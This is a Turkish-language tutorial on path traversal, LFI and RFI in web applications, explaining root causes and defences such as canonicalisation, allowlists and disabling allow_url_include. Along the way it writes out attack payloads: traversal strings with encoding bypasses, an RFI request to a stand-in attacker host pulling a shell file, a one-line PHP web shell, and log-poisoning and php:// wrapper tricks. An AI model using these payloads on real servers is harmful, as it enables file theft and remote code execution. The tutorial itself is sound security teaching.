# Path Traversal, LFI ve RFI

## Giriş ve Tanımlar

Web uygulamaları sürekli olarak dosya sistemiyle konuşur: bir şablon dahil eder, bir kullanıcının profil fotoğrafını okur, bir dilin çeviri dosyasını yükler, bir loga yazar. Bu işlemlerin hemen hepsinde bir dosya yolu (path) kullanılır. Sorun, bu yolun bir parçasının kullanıcıdan gelen girdiyle oluşturulmasıyla başlar. Uygulama, kullanıcının verdiği değeri kör bir güvenle dosya sistemine ilettiğinde, saldırgan bu değeri manipüle ederek erişmemesi gereken dosyalara ulaşabilir veya sunucuya kendi kodunu çalıştırabilir.

Bu makalenin konusu olan üç zafiyet birbiriyle akraba ama aynı şey değildir:

- **Path Traversal** (yol geçişi, diğer adıyla *directory traversal* ya da *dot-dot-slash* saldırısı): Saldırganın, uygulamanın niyet ettiği dizin ağacının **dışına çıkarak** sunucudaki keyfi dosyaları okuması (bazen yazması). Klasik örneği `../../../../etc/passwd` dizisidir.
- **LFI (Local File Inclusion)**: Uygulamanın, bir kullanıcı girdisine göre **yerel** bir dosyayı çalıştırma/dahil etme mekanizmasına (özellikle PHP `include`/`require` gibi) sokması. Burada dosya yalnızca okunmakla kalmaz, çoğu zaman **yorumlanır** — bu yüzden LFI çoğu zaman kod çalıştırmaya (RCE) giden bir kapıdır.
- **RFI (Remote File Inclusion)**: LFI'nin uzak sürümü. Uygulama, dahil edilecek dosyanın yolunu bir URL olacak şekilde kabul ederse, saldırgan `http://kotu.site/shell.txt` gibi **uzaktaki** bir dosyayı dahil ettirebilir. Bu, doğrudan ve anında remote code execution demektir.

Path Traversal genellikle bir **okuma** zafiyetidir (bilgi ifşası). LFI ve RFI ise bir **dahil etme** (inclusion) zafiyetidir ve doğaları gereği kod çalıştırmaya çok daha yakındır. Üçünün ortak kökü ise aynıdır: **kullanıcı girdisinin bir dosya yoluna güvenilerek katılması ve o yolun sınırlarının doğrulanmaması.**

## Kök Neden: Neden Bu Zafiyet Ortaya Çıkıyor?

Bu zafiyetlerin teknik kökü, işletim sistemlerinin dosya yolu çözümleme (path resolution) mantığında yatar. Bir dosya yolu, dosya sistemi için basit bir metin dizisi değil, ağaç yapısında gezinme talimatıdır. Bu talimat dilinde iki özel sembol vardır:

- `.` — mevcut dizin
- `..` — bir üst dizin (ebeveyn)

Bir uygulama şöyle bir kod yazdığında:

```
$dosya = "/var/www/yuklenenler/" . $_GET['ad'];
readfile($dosya);
```

geliştirici zihninde `ad` parametresinin `kedi.jpg` gibi bir şey olduğunu varsayar ve `/var/www/yuklenenler/kedi.jpg` okunmasını bekler. Ama saldırgan `ad` değerini `../../../../etc/passwd` yaparsa, oluşan yol şu olur:

```
/var/www/yuklenenler/../../../../etc/passwd
```

İşletim sistemi bu yolu çözerken her `..` için bir üst dizine çıkar. Yeterince `..` verildiğinde dosya sisteminin köküne (`/`) ulaşılır — köke geldikten sonra fazladan `..` vermenin bir zararı yoktur, kök kendi ebeveynidir. Sonra `etc/passwd`'e inilir. Sonuç: uygulama, kendi klasörünün çok dışındaki bir sistem dosyasını okur.

**Buradaki asıl kök neden şudur:** Uygulama, yolu bir *metin* olarak birleştirmektedir; ama dosya sistemi onu *anlamsal bir talimat* olarak yorumlamaktadır. Geliştirici ile işletim sistemi arasında bu semantik uçurum, girdinin doğrulanmadığı her yerde bir zafiyete dönüşür. Bu, aslında injection ailesinin bir üyesidir: burada "yorumlayıcı" SQL motoru değil, dosya sistemidir.

RFI'nin kök nedeni ise biraz farklıdır ve dile özgüdür. PHP'nin `include`/`require` fonksiyonları, verilen dizeyi yerel yol *veya* bir URL olarak kabul edebilir; `allow_url_include` yönlendirmesi (directive) açık olduğunda `include("http://...")` çağrısı uzaktaki içeriği indirip **PHP kodu olarak çalıştırır**. Yani RFI, "dosya dahil etme" özelliğinin ağ üzerinden içerik çekebilecek kadar esnek tasarlanmasının doğrudan bir sonucudur.

## Somut Örnekler

### Örnek 1: Klasik Path Traversal ile dosya okuma

Bir dil dosyası yükleyen endpoint düşünün:

```
GET /goster?sayfa=hakkimizda.html
```

Sunucu tarafı:

```
$sayfa = $_GET['sayfa'];
include("/var/www/sayfalar/" . $sayfa);
```

Saldırgan şunu dener:

```
GET /goster?sayfa=../../../../etc/passwd
```

Eğer başka bir savunma yoksa, `/etc/passwd` içeriği yanıt gövdesinde geri döner. Windows tarafında karşılığı `..\..\..\..\windows\win.ini` gibi bir yol olur; ayırıcı ters bölü (`\`) olsa da Windows API'leri çoğu zaman düz bölüyü de (`/`) kabul eder, bu yüzden saldırgan her iki ayırıcıyı da dener.

### Örnek 2: Uzantı eklenerek yapılan "savunmanın" atlatılması

Geliştiriciler bazen dosya uzantısını kendileri ekleyerek "güvende" olduklarını düşünür:

```
include("/var/www/sablonlar/" . $_GET['tema'] . ".php");
```

Bu kod, saldırganın istediği `../../etc/passwd`'i `../../etc/passwd.php` yaptığı için görünüşte güvenlidir — çünkü öyle bir dosya yoktur. Ancak bu savunmanın tarihsel olarak birçok atlatma (bypass) yöntemi bulunmuştur. Bunların en meşhuru **null byte injection**'dır: saldırgan `../../etc/passwd%00` gönderir; URL çözümlemesi sonrası oluşan `\0` (null karakteri), C tabanlı dosya sistemi çağrılarında dizenin sonu olarak yorumlanabilir ve sona eklenen `.php` göz ardı edilir. Bu teknik özellikle eski PHP (5.3 öncesi) sürümlerinde çalışırdı; güncel sürümlerde büyük ölçüde kapatılmıştır, ama modern olmayan yığınlarda hâlâ karşılaşılır. Bu yüzden "uzantı ekliyorum, güvendeyim" varsayımı yanlıştır.

### Örnek 3: RFI ile doğrudan RCE

```
include($_GET['modul'] . ".php");
```

`allow_url_include` açıksa:

```
GET /index.php?modul=http://saldirgan.site/shell.txt?
```

Uygulama uzaktaki `shell.txt` içeriğini çeker ve PHP olarak çalıştırır. `shell.txt` içinde `<?php system($_GET['cmd']); ?>` gibi bir satır varsa, saldırgan artık sunucuda komut çalıştırıyordur. Sondaki `?` işareti, uygulamanın eklediği `.php` uzantısını URL sorgu dizesinin parçası yaparak etkisiz kılan bilinen bir hiledir.

## LFI'yi RCE'ye Dönüştürmek (LFI-to-RCE)

LFI çoğu zaman "yalnızca dosya okuma" gibi görünür, ama gerçek uzman bakış açısı şudur: **eğer dahil edilen dosya yorumlanıyorsa (PHP gibi), saldırganın tek ihtiyacı, kontrol ettiği içeriği sunucudaki bir dosyaya yerleştirmektir.** Ondan sonra o dosyayı LFI ile dahil ederek çalıştırır. Bu içeriği sunucuya sokmanın klasik yolları vardır:

- **Log poisoning (log zehirleme):** Web sunucusunun erişim logları (`access.log`), `User-Agent` veya istek yolu gibi saldırgan kontrollü alanları kaydeder. Saldırgan `User-Agent` başlığına `<?php system($_GET['cmd']); ?>` yazar; bu satır loga düşer. Sonra LFI ile log dosyasını dahil eder (`?sayfa=../../../var/log/apache2/access.log`) ve loga gömülen PHP çalışır. Aynı mantık mail logları, FTP logları ve SSH auth logları için de geçerlidir (`auth.log`'a geçersiz kullanıcı adı olarak PHP enjekte etmek gibi).
- **Session dosyaları:** PHP oturum verileri sunucuda `/tmp/sess_<id>` gibi dosyalarda tutulur. Saldırgan, oturuma yansıyan bir alana (örneğin kullanıcı adı) PHP kodu koyabilirse, sonra o session dosyasını LFI ile dahil edebilir.
- **Yüklenen dosyalar:** Uygulama dosya yüklemeye izin veriyorsa (avatar vb.) ve yüklenen dosyanın yolu tahmin edilebiliyorsa, içine PHP gömülü bir dosya yüklenir ve LFI ile çalıştırılır.
- **`php://filter` ve `php://input` sarmalayıcıları (wrappers):** PHP'nin akış sarmalayıcıları LFI'yi güçlendirir. `php://filter/convert.base64-encode/resource=index.php` ile kaynak kodu base64 olarak sızdırılabilir (bilgi ifşası). Daha güçlüsü, `php://input` sarmalayıcısı POST gövdesini doğrudan dahil edilecek "dosya" olarak sunar; `allow_url_include` açıkken saldırgan PHP kodunu POST gövdesinde gönderip çalıştırabilir.
- **`data://` sarmalayıcısı:** `data://text/plain;base64,<...>` biçiminde, dahil edilecek içeriğin tamamını URL içinde base64 olarak taşır. Yine `allow_url_include`'a bağımlıdır.

Bu tekniklerin ortak dersi şudur: LFI'yi "sadece okuma, düşük risk" olarak etiketlemek tehlikeli bir yanılgıdır. Yorumlanan bir bağlamda LFI, neredeyse her zaman RCE potansiyeli taşır. Risk sınıflandırmasını buna göre yapmak gerekir.

## Kanonikleştirme (Canonicalization): İşin Kalbi

Bu üç zafiyetin savunmasında en kritik ve en çok yanlış anlaşılan kavram **kanonikleştirme**dir (canonicalization / path normalization). Kanonik biçim, bir yolun tüm `.`, `..`, sembolik bağlantı (symlink) ve tekrarlı ayırıcılardan arındırılmış, tek ve kesin gerçek biçimidir. `/var/www/sayfalar/../../etc/passwd` yolunun kanonik biçimi `/etc/passwd`'dir.

Doğru savunmanın altın kuralı şudur:

> **Önce yolu tam olarak kanonikleştir (gerçek mutlak yola çöz), SONRA bu kanonik yolun izin verilen kök dizinin (base directory) içinde kalıp kalmadığını kontrol et.**

Neden bu sıra hayati? Çünkü ham dize üzerinde yapılan kontroller kandırılabilir. Çoğu geliştiricinin ilk refleksi girdide `..` var mı diye bakmaktır. Ama saldırgan `..`'yı sayısız biçimde gizleyebilir; işletim sistemi bunları çözerken kandırdığı hâlde sizin naif kontrolünüz göremez:

- **URL kodlaması:** `%2e%2e%2f` = `../`. Uygulama girdiyi kontrol etmeden önce URL çözümlemesi yapmışsa, ham `..` kontrolü işe yaramaz.
- **Çift (double) kodlama:** `%252e%252e%252f`. İlk çözümlemede `%2e%2e%2f`, ikincisinde `../` olur. Zincirde iki kez çözümleme yapan sistemleri hedefler.
- **Overlong UTF-8 / geçersiz kodlamalar:** Tarihsel olarak bazı sistemler (örneğin eski IIS'te Unicode traversal sorunu) `/` için standart olmayan çok baytlı kodlamaları kabul ederek filtreleri atlatmaya izin vermiştir.
- **Karışık ayırıcılar:** Windows'ta `..%5c` (`..\`), `....//`, `..\/` gibi varyasyonlar.
- **`....//` hilesi:** Eğer filtre, dizeden `../` kalıbını **bir kez** silerek "temizliyorsa", `....//` içindeki ortadaki `../` silinince geriye `../` kalır. Yani naif değiştirmeye dayalı temizlik kendi kendini sabote eder.

Görüldüğü gibi kara liste (blacklist) mantığı — "şu tehlikeli kalıpları arayıp reddet/sil" — bu problemde kaybetmeye mahkûmdur, çünkü aynı anlama gelen sonsuz sayıda kodlama varyasyonu vardır. Doğru yaklaşım, işletim sisteminin *kendi* çözümleyicisine güvenip yolu gerçek biçime indirgemek ve sonucu doğrulamaktır. İşletim sistemi tüm bu kodlamaları ve `..`'ları zaten çözecektir; sizin işiniz onun çözdüğü **sonucu** denetlemektir, saldırganın ham girdisini tahmin etmeye çalışmak değil.

## Savunma: Doğru Yapılış

### 1. En sağlam savunma: Girdiyi hiç yola koymamak

En güvenli tasarım, kullanıcının serbest metin yol vermesine hiç izin vermemektir. Kullanıcı, dosyayı doğrudan adlandırmak yerine bir **dolaylı tanımlayıcı** (indirect identifier) seçsin: örneğin `?sayfa=3` veya `?dil=tr` gibi. Sunucu, bu tanımlayıcıyı sunucu tarafında tutulan bir **beyaz liste** (allowlist) eşlemesinden gerçek dosya adına çevirsin:

```
$izinli = ['tr' => 'ceviriler/tr.json', 'en' => 'ceviriler/en.json'];
if (!isset($izinli[$_GET['dil']])) { reddet(); }
$dosya = $izinli[$_GET['dil']];
```

Bu yaklaşımda saldırganın enjekte edeceği hiçbir yol dizesi yoktur; harita dışındaki her değer reddedilir. Yol tabanlı zafiyetleri kökten yok eden en güçlü yöntem budur.

### 2. Kanonikleştir-ve-doğrula (canonicalize-then-verify)

Serbest ad kabul etmek zorunlu ise, yolu çözüp taban dizininde kaldığını doğrulayın. Prensip her dilde aynıdır:

- Taban dizinin kanonik mutlak yolunu al (`realpath`).
- Kullanıcı girdisini birleştirip yine kanonikleştir.
- Sonuç, taban dizinin yolu ile başlamıyorsa **reddet**.

PHP'de mantık:

```
$taban = realpath("/var/www/sayfalar");
$hedef = realpath($taban . "/" . $_GET['sayfa']);
if ($hedef === false || strpos($hedef, $taban . DIRECTORY_SEPARATOR) !== 0) {
    reddet();
}
```

Java'da `Path.normalize()` sonrası `startsWith` kontrolü, Node.js'te `path.resolve` sonrası taban dizinle karşılaştırma, Python'da `os.path.realpath` (ya da `pathlib`'in `resolve()`) sonrası ortak öntek (prefix) kontrolü aynı fikri uygular.

Burada iki ince nokta vardır. Birincisi: karşılaştırmayı yaparken taban dizinin sonuna **ayırıcı ekleyerek** kontrol edin. Aksi hâlde `/var/www/sayfalar` ile `/var/www/sayfalar-gizli` gibi bir dizin öntek testini geçebilir; sona ayırıcı eklemek bu sınır sızıntısını kapatır. İkincisi: `realpath` sembolik bağlantıları da çözer, bu iyidir; ama dosya henüz yoksa `realpath` `false` döndürebilir — yazma senaryolarında bunu ayrıca ele almak gerekir (üst dizini çözüp orada doğrulamak gibi).

### 3. RFI'ye karşı yapılandırma sıkılaştırması

RFI, büyük ölçüde bir yapılandırma zafiyetidir. PHP'de:

- `allow_url_include`'ı **kapalı** tutun. Bu, `include`/`require`'ın URL ve `php://input`/`data://` üzerinden uzak içerik çalıştırmasını engelleyen tek en etkili ayardır.
- `allow_url_fopen`'ı gerçekten gerekmedikçe kapalı tutun.
- Dahil edilecek yolu asla ham kullanıcı girdisinden almayın; her zaman beyaz listeden geçirin.

Modern PHP dağıtımlarında `allow_url_include` varsayılan olarak kapalıdır, bu yüzden klasik RFI bugün LFI'ye göre daha nadirdir; ancak eski veya yanlış yapılandırılmış sunucularda hâlâ karşımıza çıkar.

### 4. Derinlemesine savunma (defense in depth)

Tek bir kontrole güvenmeyin; katmanlayın:

- **En az ayrıcalık (least privilege):** Web sunucusu prosesinin okuyabileceği dosyaları işletim sistemi düzeyinde kısıtlayın. Traversal başarılı olsa bile proses `/etc/shadow`'u okuyamıyorsa hasar sınırlıdır.
- **chroot / konteyner / namespace izolasyonu:** Uygulamayı dosya sisteminin dar bir alt ağacına hapsedin. `..` ile ne kadar çıkılırsa çıkılsın hapsin dışına ulaşılamaz.
- **`open_basedir` (PHP):** PHP'nin dosya işlemlerini belirli dizinlere kısıtlayan yerleşik bir çit. Tek başına yeterli değildir ama iyi bir ek katmandır.
- **WAF:** Bilinen traversal imzalarını yakalar. Ama bunu birincil savunma sanmayın; kodlama varyasyonlarıyla atlatılabilir, sadece bir gürültü azaltıcıdır.
- **Kısıtlı dosya adı doğrulaması:** İş kuralınız izin veriyorsa, dosya adını sıkı bir beyaz listeye uydurun — örneğin yalnızca `[a-zA-Z0-9_-]` ve tek bir `.` içeren adlar; ayırıcı ve `..` içeren her şeyi reddedin. Bu, kanonikleştirmenin yerini tutmaz ama ek bir bariyerdir.

## Sömürü Mantığı ve Savunmanın Aynı Madalyonun İki Yüzü Olması

Bu zafiyette saldırgan ile savunmacının düşünce biçimi ayna görüntüsüdür ve ikisini birlikte anlamak, tek başına birini anlamaktan çok daha öğreticidir.

**Saldırgan** şu soruları sorar: "Bu parametre dosya sistemine mi gidiyor? Uygulama bana uzantı mı ekliyor, ekliyorsa null byte veya `?`/`#` ile kesebilir miyim? Girdi kaç kez URL-çözümleniyor; çift kodlama işe yarar mı? Ayırıcı olarak `\` kabul ediliyor mu? Filtre `../` siliyorsa `....//` ile yeniden oluşturabilir miyim? Bir yere PHP yazıp (log, session, upload) sonra onu dahil ettirebilir miyim? `php://filter` ile kaynak kodu sızdırıp başka sırlara (DB parolası, uygulama anahtarları) ulaşabilir miyim?"

**Savunmacı** ise aynı soruların her birini kapatacak kararı verir: "Girdiyi hiç yola koymam, beyaz liste kullanırım. Koymak zorundaysam önce kanonikleştirir sonra taban dizinde kaldığını doğrularım — ham dize üzerinde kalıp aramam, çünkü kodlama varyasyonlarını asla tümüyle sayamam. Uzantıyı kendim ekleyip güvende sanmam. `allow_url_include`'ı kaparım. Prosesi en az ayrıcalıkla ve mümkünse chroot/konteyner içinde çalıştırırım ki traversal başarılı olsa bile ödül küçük olsun."

İki listeyi yan yana koyduğunuzda görülür ki her sömürü tekniğinin karşısında onu geçersiz kılan bir savunma prensibi vardır; ve neredeyse tüm savunmalar tek bir doğru fikre indirgenir: **girdiye değil, işletim sisteminin çözdüğü sonuca güven ve o sonucu izin verilen sınıra karşı doğrula.**

## Yaygın Hatalar

Sahada tekrar tekrar görülen ve zafiyeti açık bırakan hatalar şunlardır:

- **Kara liste ile temizlemeye güvenmek.** Girdiden `../` dizisini silmek veya arayıp reddetmek. Kodlama varyasyonları (`%2e%2e`, çift kodlama), `....//` gibi kendini yeniden üreten kalıplar ve karışık ayırıcılar bunu delip geçer.
- **Doğrulamayı yanlış sırada yapmak.** Kanonikleştirmeden *önce* ham dizede kontrol yapmak. Doğru sıra her zaman: önce çöz, sonra doğrula. Aksi hâlde işletim sisteminin çözdüğü ile sizin denetlediğiniz farklı iki şey olur.
- **Uzantı ekleyerek güvende olduğunu sanmak.** `.php`/`.html` eklemenin null byte, sorgu dizesi hilesi (`?`, `#`) ve (bazı bağlamlarda) yol kesme ile atlatıldığını unutmak.
- **LFI'yi "sadece okuma" diye küçümsemek.** Yorumlanan bir bağlamda LFI, log/session zehirleme veya `php://input` ile neredeyse her zaman RCE'ye tırmanır. Risk sınıflandırmasını buna göre yükseltmek gerekir.
- **Öntek karşılaştırmasında ayırıcıyı unutmak.** `startsWith("/var/www/sayfalar")` kontrolünün `/var/www/sayfalar-gizli`'yi de geçirdiğini fark etmemek. Karşılaştırmayı sondaki ayırıcıyla yapmak gerekir.
- **Sembolik bağlantıları hesaba katmamak.** Taban dizin içindeki bir symlink dışarıya işaret ediyorsa, `..` kullanmadan da dışarı çıkılabilir. Bu yüzden `realpath` gibi symlink'i çözen bir kanonikleştirme şarttır.
- **WAF'ı tek savunma sanmak.** İmza tabanlı filtreler yardımcıdır ama atlatılabilir; asıl güvenlik kodda ve yapılandırmadadır.
- **Yalnızca okuma senaryosunu düşünüp yazmayı unutmak.** Path traversal bazen dosya *yazmaya* da izin verir (upload yolu, log yolu); bu, keyfi dosya yazma ve dolayısıyla RCE demektir. Aynı kanonikleştir-ve-doğrula disiplini yazma yolları için de geçerlidir.

## En İyi Pratikler (Özet)

1. **Mümkünse kullanıcıya hiç serbest yol verme.** Dolaylı tanımlayıcı + sunucu tarafı beyaz liste eşlemesi en güçlü çözümdür.
2. **Serbest ad kaçınılmazsa: önce kanonikleştir, sonra taban dizinde kaldığını doğrula.** Ham dize üzerinde kalıp arama yapma.
3. **Öntek kontrolünü sondaki ayırıcıyla yap** ki komşu dizin adları sınırı geçemesin.
4. **Symlink'leri çözen kanonikleştirme kullan** (`realpath` ve muadilleri).
5. **RFI için `allow_url_include`'ı kapat**, gereksiz `allow_url_fopen`'ı kapat, dahil edilecek yolu asla ham girdiden alma.
6. **LFI'yi RCE riski olarak sınıflandır**; log/session/upload zehirleme ve `php://` sarmalayıcı vektörlerini tehdit modeline dahil et.
7. **Derinlemesine savun:** en az ayrıcalık, chroot/konteyner izolasyonu, `open_basedir`, WAF — hiçbirine tek başına güvenme.
8. **Kütüphane ve framework'ün güvenli yol API'lerini kullan;** yolları elle string birleştirmekten kaçın. Diller genellikle güvenli birleştirme ve normalize fonksiyonları sunar.
9. **Kod incelemesinde ve testte özellikle ara:** dosya sistemi çağrılarına akan her parametreyi izle; kodlama varyasyonları, null byte, çift kodlama ve karışık ayırıcılarla test et.

Sonuç olarak Path Traversal, LFI ve RFI, kökeninde tek bir hatanın farklı yüzleridir: **kullanıcı girdisine dosya sistemi bağlamında körü körüne güvenmek.** Bu zafiyetleri kalıcı olarak çözmenin yolu, saldırganın sonsuz kodlama hilelerini kovalamak değil; ya girdiyi bir yola hiç sokmamak ya da işletim sisteminin çözdüğü kanonik sonucu izin verilen sınıra karşı katı bir biçimde doğrulamaktır.
